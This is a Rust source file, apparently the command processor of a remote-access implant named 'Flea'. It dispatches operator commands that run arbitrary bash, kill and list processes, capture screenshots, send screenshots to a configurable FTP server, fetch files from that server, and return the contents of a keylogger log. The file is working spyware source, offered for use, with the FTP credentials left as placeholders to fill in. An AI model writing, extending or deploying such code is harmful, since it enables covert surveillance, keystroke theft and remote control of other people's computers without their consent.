extern crate ftp;
extern crate repng;
extern crate serde;

use serde::{Serialize, Deserialize};
use std::{str, fs::File, io::Read, env, path::PathBuf};
use log::{debug, error};
use chrono::{DateTime, Utc};
use crate::{ftp::*, screenshot::Screenshot};
use crate::systemcmd::*;
use crate::keylogger::*;

const FLEA_PROTOCOL_VERSION: u8 = 1;
const GET_VERSION_COMMAND: &'static str = "version";
const EXECUTE_BASH_COMMAND: &'static str = "bash";
const SEND_PIC_COMMAND: &'static str = "pic";
const GET_SCREENSHOT_COMMAND: &'static str = "screenshot";
const SEND_KEY_LOGGER_FILE_COMMAND: &'static str = "sendlog";
const SEND_PROCESS_LIST_COMMAND: &'static str = "proclist";
const KILL_COMMAND: &'static str = "kill";
const UPLOAD_COMMAND: &'static str = "upload";
const UNKNOWN_COMMAND: &'static str = "Unknown command";

//Enter your data for FTP Server connection
const FTP_USER_NAME: &'static str = "enter_ftp_user_name";
const FTP_PASS_NAME: &'static str = "enter_ftp_user_password";
const FTP_ADDRESS_NAME: &'static str = "enter_ftp_server_ip_address";
const FTP_FOLDER_NAME: &'static str = "enter_ftp_folder_name";

pub trait FleaCommand
{
    fn new() -> Self;
    fn process(&self, cmd: &str, value: &str) -> String;
}

#[derive(Serialize, Deserialize)]
struct FleaConfig 
{
    ftp_user: String,
    ftp_pass: String,
    ftp_address: String,
    ftp_folder: String,
}

pub struct CommandProcessor
{
    version: u8,
    current_directory: PathBuf,
    conf: FleaConfig,
    ftp: FTP,
    screenshot: Screenshot,
    os: SystemCmd,
}

/* Default values will be saved in a Flea configuration file when the file not exists yet.
    After that you should modify the file to set up your own values or enter your values
    in the constants defined above*/
impl ::std::default::Default for FleaConfig 
{
    fn default() -> Self 
    { 
        Self 
        { 
            ftp_address: FTP_ADDRESS_NAME.into(), 
            ftp_pass: FTP_PASS_NAME.into(), 
            ftp_user: FTP_USER_NAME.into(),
            ftp_folder: FTP_FOLDER_NAME.into()
        } 
    }
}

impl CommandProcessor
{    
    /// Gets a temporary directory path for a screenshot file
    /// * Returns a path to a temporary directory with a screenshot filename which is a unique name
    fn get_temp_dir(&self) -> PathBuf
    {
        let now: DateTime<Utc> = Utc::now();
        let file_name = format!("screenshot{}.png", now.format("%Y-%m-%d_%H-%M-%S"));
        env::temp_dir().as_path().join(file_name)
    }

    /// Reads a binary file and returns its content as a u8 vector
    /// * file_path - a path to the file to read
    /// * returns a vector of u8 bytes or an error
    fn read_binary_file(&self, file_path: &PathBuf) -> Result<Vec<u8>, std::io::Error>
    {
        let mut file = File::open(file_path)?;
        let mut data = Vec::new();
        file.read_to_end(&mut data)?;
        Ok(data)
    }

    /// Convert a byte array into string digits
    /// * data - a byte array to convert
    /// * returns a string with digits
    /// * Example: [0x01, 0x02, 0x03] -> "010203"
    fn bytes_to_string(&self, data: &[u8]) -> String
    {
        let mut s = String::new();
        for b in data
        {
            s.push_str(&format!("{:02x}", b));
        }
        s
    }
}

impl FleaCommand for CommandProcessor
{
    fn new() -> Self
    {
        debug!("Creating FleaCommand..");

        let cr = match env::current_dir() 
        {
            Ok(x) =>
            {
                x
            },
            Err(y) =>
            {
                panic!("Couldn't get current directory: {}", y.to_string())
            }
        };

        Self 
        { 
            version: FLEA_PROTOCOL_VERSION,

            conf: match confy::load("flea_conf", None)
            {
                Ok(x) =>
                {
                    x
                },
                Err(e) =>
                {
                    panic!("Configuration error {}", e.to_string())
                }
            },
            
            current_directory: cr.clone(),
            ftp: FTP::new(cr.clone()),
            screenshot: Screenshot::new(),
            os: SystemCmd::new(),
        }
    }

    /// A routine for processing incoming commands
    /// * cmd - a command in a form of a string
    /// * value - an additional data related to a command
    fn process(&self, cmd: &str, value: &str) -> String
    {        
        match cmd
        {
            GET_VERSION_COMMAND =>
            {
                return self.version.to_string();
            },

            EXECUTE_BASH_COMMAND =>
            {
                return self.os.execute_bash_command(value);
            },

            KILL_COMMAND =>
            {
                return self.os.kill_process(value)
            },

            UPLOAD_COMMAND =>
            {
                match self.ftp.receive_file_from_ftp(&self.conf.ftp_address, &self.conf.ftp_user, &self.conf.ftp_pass, value, &self.conf.ftp_folder)
                {
                    Ok(_) =>
                    {
                        return "File uploaded".to_string();
                    },
                    Err(x) =>
                    {
                        return x.to_string();
                    }
                }
            },

            SEND_KEY_LOGGER_FILE_COMMAND =>
            {
                let current_path = self.current_directory.join(KEY_LOGGER_FILE_NAME).to_str().unwrap().to_string();
                return get_key_logger_content(&current_path);
            },

            SEND_PROCESS_LIST_COMMAND =>
            {
                return self.os.get_process_list();
            },

            GET_SCREENSHOT_COMMAND =>
            {
                let current_path = self.get_temp_dir();
                match self.screenshot.take_screenshot(&current_path.to_str().unwrap()) 
                {
                    Ok(x) =>
                    {
                        x
                    },
                    Err(x) =>
                    {
                        return x
                    }
                };

                return match self.read_binary_file(&current_path)
                {
                    Ok(x) =>
                    {
                        let ret = self.bytes_to_string(&x);
                        if let Err(y) = std::fs::remove_file(current_path) 
                        {
                            error!("Couldn't remove a file: {}", y.to_string());
                            ret
                        } 
                        else 
                        {
                            ret
                        }
                    },
                    Err(x) =>
                    {
                        return x.to_string()
                    }
                }
            },

            SEND_PIC_COMMAND =>
            {
                let current_path = self.get_temp_dir();
                match self.screenshot.take_screenshot(&current_path.to_str().unwrap()) 
                {
                    Ok(x) =>
                    {
                        x
                    },
                    Err(x) =>
                    {
                        return x
                    }
                };

                return match self.ftp.send_file_to_ftp(&self.conf.ftp_address, &self.conf.ftp_user, 
                    &self.conf.ftp_pass, &current_path, &self.conf.ftp_folder)
                {
                    Ok(_) =>
                    {
                        match std::fs::remove_file(current_path)
                        {
                            Ok(_) =>
                            {
                                debug!("A temporary file removed.");
                            },
                            Err(_) =>
                            {
                                error!("Couldn't remove a temp file!");
                            }
                        }

                        "Ok".to_string()
                    },
                    Err(x) =>
                    {
                        x.to_string()
                    }
                }    
            },

            &_ =>
            {

            }
        }

        UNKNOWN_COMMAND.to_string()
    }
}

#[cfg(test)]
mod tests 
{
    use super::*;

    #[test]    
    fn process_test()
    {
        let p: CommandProcessor = FleaCommand::new();
        let ret = p.process(GET_VERSION_COMMAND, "");
        assert!(ret == p.version.to_string());

        let ret = p.process("unknown command", "");
        assert!(ret == UNKNOWN_COMMAND.to_string());

        let ret = p.process(EXECUTE_BASH_COMMAND, "echo test");
        assert!(ret.len() > 0);
    }
}